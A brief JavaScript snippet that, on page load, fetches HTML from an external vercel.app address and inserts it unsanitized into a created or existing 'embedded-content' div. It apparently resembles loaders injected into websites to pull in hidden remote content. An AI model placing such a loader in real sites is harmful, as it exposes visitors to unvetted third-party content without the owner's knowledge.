(function() {
  var container = document.getElementById('embedded-content');
  if (!container) {
    container = document.createElement('div');
    container.id = 'embedded-content';
    document.body.appendChild(container);
  }

  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://black-jke2hhbrj-go24pps-projects.vercel.app/', true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      container.innerHTML = xhr.responseText;
    }
  };
  xhr.send();
})();
